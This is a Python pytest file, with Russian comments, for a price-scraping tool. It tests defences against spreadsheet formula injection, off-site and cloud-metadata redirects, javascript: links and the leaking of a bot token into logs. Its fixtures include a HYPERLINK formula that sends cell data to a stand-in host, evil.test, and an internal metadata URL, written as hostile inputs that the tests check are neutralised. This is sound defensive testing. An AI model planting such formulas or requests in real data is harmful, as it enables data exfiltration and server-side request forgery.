"""Проверки безопасности: формулы из данных сайта, чужие ссылки и редиректы, токен в журнале."""

import io
import logging
import sys
import types

import pytest
from conftest import FakeSite, make_book, make_list
from openpyxl import load_workbook
from test_gsheet import FakeBook, NotFound

from pricewatch import __main__ as app
from pricewatch import export, fetch, store
from pricewatch.crawl import crawl
from pricewatch.parse import Product

ROOT = "https://shop.test/catalogue/"
EVIL = '=HYPERLINK("https://evil.test/?d="&A2,"жми")'


def _db(tmp_path):
    conn = store.connect(tmp_path / "db.sqlite")
    store.save_snapshot(conn, [Product("a", EVIL, 10.0, 3, 4, "@SUM(1)", "https://shop.test/a")], True)
    return conn


def test_excel_keeps_formula_like_title_as_text(tmp_path):
    conn = _db(tmp_path)
    path = export.to_excel(store.current(conn), store.recent_changes(conn), tmp_path / "p.xlsx")
    cell = load_workbook(path)["Товары"]["A2"]
    assert cell.value == EVIL and cell.data_type == "s"


def test_gsheet_escapes_formula_like_text(tmp_path, monkeypatch):
    book = FakeBook()
    fake = types.SimpleNamespace(
        service_account=lambda filename: types.SimpleNamespace(open_by_key=lambda key: book),
        WorksheetNotFound=NotFound,
    )
    monkeypatch.setitem(sys.modules, "gspread", fake)
    conn = _db(tmp_path)
    export.to_gsheet(store.current(conn), store.recent_changes(conn), "S", "/k.json")
    row = book.sheets["Товары"].data[1]
    assert row[0] == "'" + EVIL and row[1] == "'@SUM(1)"
    assert row[2] == 10.0  # числа не трогаем


def test_crawl_ignores_foreign_and_non_http_links():
    pages = {
        ROOT + "page-1.html": make_list(
            ["a/index.html", "http://169.254.169.254/latest/", "javascript:alert(1)"], None
        ),
        ROOT + "a/index.html": make_book("upc-a", "А", 10, 5),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert [p.upc for p in res.products] == ["upc-a"]
    assert fake.hits == [ROOT + "page-1.html", ROOT + "a/index.html"]
    # обход неполный — товары не помечаются «пропал с сайта»
    assert len(res.errors) == 2 and not res.complete


def test_crawl_stops_on_foreign_next_page():
    pages = {
        ROOT + "page-1.html": make_list(["a/index.html"], "https://evil.test/page-2.html"),
        ROOT + "a/index.html": make_book("upc-a", "А", 10, 5),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert "https://evil.test/page-2.html" not in fake.hits
    assert len(res.products) == 1 and not res.complete


def test_redact_hides_token_in_foreign_logs_and_tracebacks():
    buf = io.StringIO()
    handler = logging.StreamHandler(buf)
    handler.addFilter(app.Redact("123:SECRET"))
    log = logging.getLogger("urllib3.test-redact")
    log.addHandler(handler)
    log.propagate = False
    try:
        # так urllib3 пишет повтор запроса к Telegram
        log.warning("Retrying after connection broken by '%r': %s", "err", "/bot123:SECRET/sendMessage")
        try:
            raise OSError("https://api.telegram.org/bot123:SECRET/sendMessage")
        except OSError:
            log.exception("failed")
    finally:
        log.removeHandler(handler)
    out = buf.getvalue()
    assert "SECRET" not in out and out.count("***") == 3


def test_main_installs_redact_filter(monkeypatch, tmp_path):
    handler = logging.StreamHandler(io.StringIO())
    root = logging.getLogger()
    monkeypatch.setattr(root, "handlers", [handler])
    cfg = types.SimpleNamespace(tg_token="123:SECRET")
    monkeypatch.setattr(app.config, "load", lambda: cfg)
    monkeypatch.setattr(app, "run_once", lambda c: app.RunReport(0, 0, 0, True))
    app.main([])
    assert any(isinstance(f, app.Redact) and f.secret == "123:SECRET" for f in handler.filters)


class _Redirects:
    """Сессия-заглушка: адрес → (код, Location или текст страницы)."""

    def __init__(self, routes):
        self.routes, self.hits = routes, []

    def get(self, url, timeout, allow_redirects=True):
        assert allow_redirects is False  # иначе requests сам уйдёт по Location
        self.hits.append(url)
        code, body = self.routes[url]

        class R:
            status_code = code
            is_redirect = code in (301, 302, 303, 307, 308)
            headers = {"location": body}
            encoding = "utf-8"
            text = body

            def raise_for_status(self):
                pass

        return R()


def test_fetch_refuses_redirect_to_internal_host():
    s = _Redirects({ROOT + "a": (302, "http://169.254.169.254/latest/meta-data/")})
    with pytest.raises(fetch.RedirectError):
        fetch.get_html(s, ROOT + "a")
    assert s.hits == [ROOT + "a"]


def test_fetch_refuses_https_to_http_redirect():
    s = _Redirects({ROOT + "a": (301, "http://shop.test/catalogue/a")})
    with pytest.raises(fetch.RedirectError):
        fetch.get_html(s, ROOT + "a")
    assert s.hits == [ROOT + "a"]


def test_fetch_follows_same_site_redirect_and_stops_loops():
    s = _Redirects({ROOT + "a": (302, "b"), ROOT + "b": (200, "ok")})
    assert fetch.get_html(s, ROOT + "a") == "ok"
    loop = _Redirects({ROOT + "a": (302, "a")})
    with pytest.raises(fetch.RedirectError):
        fetch.get_html(loop, ROOT + "a")
    assert len(loop.hits) == fetch.MAX_REDIRECTS + 1


@pytest.mark.parametrize(
    "url, base",
    [
        ("https://www.example.ru/a", "https://example.ru/"),  # без www → www
        ("https://example.ru/a", "https://www.example.ru/"),  # www → без www
        ("https://WWW.Example.RU/a", "https://example.ru/"),
        ("https://www.example.ru/a", "http://example.ru/"),  # http → https можно
        ("https://www.example.ru:8443/a", "https://example.ru:8443/"),
    ],
)
def test_same_site_treats_www_as_same_host(url, base):
    assert fetch.same_site(url, base)


@pytest.mark.parametrize(
    "url, base",
    [
        ("https://evil.com/", "https://example.ru/"),
        ("https://shop.example.ru/", "https://example.ru/"),  # поддомен — чужой
        ("https://www.shop.example.ru/", "https://example.ru/"),  # поддомен с www — тоже чужой
        ("https://example.ru.evil.com/", "https://example.ru/"),
        ("https://www.example.ru.evil.com/", "https://www.example.ru/"),
        ("https://evil-example.ru/", "https://example.ru/"),
        ("https://wwwexample.ru/", "https://example.ru/"),
        ("https://www.www.example.ru/", "https://example.ru/"),  # снимаем одну «www.»
        ("https://example.ru:8443/", "https://example.ru/"),
        ("https://www.example.ru:8443/", "https://example.ru/"),
        ("https://www.example.ru/", "https://example.ru:8443/"),
        ("http://www.example.ru/", "https://example.ru/"),  # откат на http
        ("http://example.ru/", "https://www.example.ru/"),
        ("https://example.ru:abc/", "https://example.ru/"),  # порт не число
        ("ftp://www.example.ru/", "https://example.ru/"),
        ("https:///a", "https:///b"),  # пустой хост
    ],
)
def test_same_site_refuses_other_sites(url, base):
    assert not fetch.same_site(url, base)


def test_fetch_follows_redirect_to_www_and_back():
    bare, www = "https://example.ru/", "https://www.example.ru/"
    s = _Redirects({bare: (301, www), www: (200, "ok")})
    assert fetch.get_html(s, bare) == "ok"
    back = _Redirects({www: (301, bare), bare: (200, "ok")})
    assert fetch.get_html(back, www) == "ok"


@pytest.mark.parametrize(
    "location",
    [
        "https://shop.example.ru/",
        "https://example.ru.evil.com/",
        "https://evil-example.ru/",
        "https://www.example.ru:8443/",
        "http://www.example.ru/",
    ],
)
def test_fetch_refuses_redirect_off_site_even_with_www(location):
    s = _Redirects({"https://example.ru/": (302, location)})
    with pytest.raises(fetch.RedirectError):
        fetch.get_html(s, "https://example.ru/")
    assert s.hits == ["https://example.ru/"]


def test_fetch_www_ping_pong_stops_after_limit():
    bare, www = "https://example.ru/", "https://www.example.ru/"
    s = _Redirects({bare: (302, www), www: (302, bare)})
    with pytest.raises(fetch.RedirectError):
        fetch.get_html(s, bare)
    assert len(s.hits) == fetch.MAX_REDIRECTS + 1


def test_crawl_takes_www_links_and_skips_subdomain():
    pages = {
        ROOT + "page-1.html": make_list(
            ["https://www.shop.test/catalogue/a/index.html", "https://m.shop.test/catalogue/b/index.html"],
            "https://www.shop.test/catalogue/page-2.html",
        ),
        "https://www.shop.test/catalogue/page-2.html": make_list(["c/index.html"], None),
        "https://www.shop.test/catalogue/a/index.html": make_book("upc-a", "А", 10, 5),
        "https://www.shop.test/catalogue/c/index.html": make_book("upc-c", "В", 20, 1),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert "https://m.shop.test/catalogue/b/index.html" not in fake.hits
    assert "https://www.shop.test/catalogue/c/index.html" in fake.hits
    assert res.pages == 2 and len(res.products) == 2
    assert res.errors == ["https://m.shop.test/catalogue/b/index.html: foreign link skipped"]


def test_crawl_skips_http_downgrade_link():
    pages = {
        ROOT + "page-1.html": make_list(["a/index.html", "http://shop.test/catalogue/b/index.html"], None),
        ROOT + "a/index.html": make_book("upc-a", "А", 10, 5),
    }
    fake = FakeSite(pages)
    res = crawl(fake, ROOT + "page-1.html")
    assert fake.hits == [ROOT + "page-1.html", ROOT + "a/index.html"]
    assert not res.complete


def test_site_retry_after_capped():
    # сайт просит подождать сутки — ждём не дольше потолка
    from urllib3.response import HTTPResponse

    from pricewatch.fetch import MAX_RETRY_AFTER, make_session

    retry = make_session().get_adapter("https://shop.test/").max_retries
    assert (
        retry.get_retry_after(HTTPResponse(status=503, headers={"Retry-After": "86400"})) == MAX_RETRY_AFTER
    )
    assert retry.get_retry_after(HTTPResponse(status=503, headers={"Retry-After": "5"})) == 5
    assert retry.get_retry_after(HTTPResponse(status=503)) is None
    # повтор урезает счётчик через new() — потолок не должен теряться
    assert type(retry.increment(method="GET", url="/", response=HTTPResponse(status=503))) is type(retry)
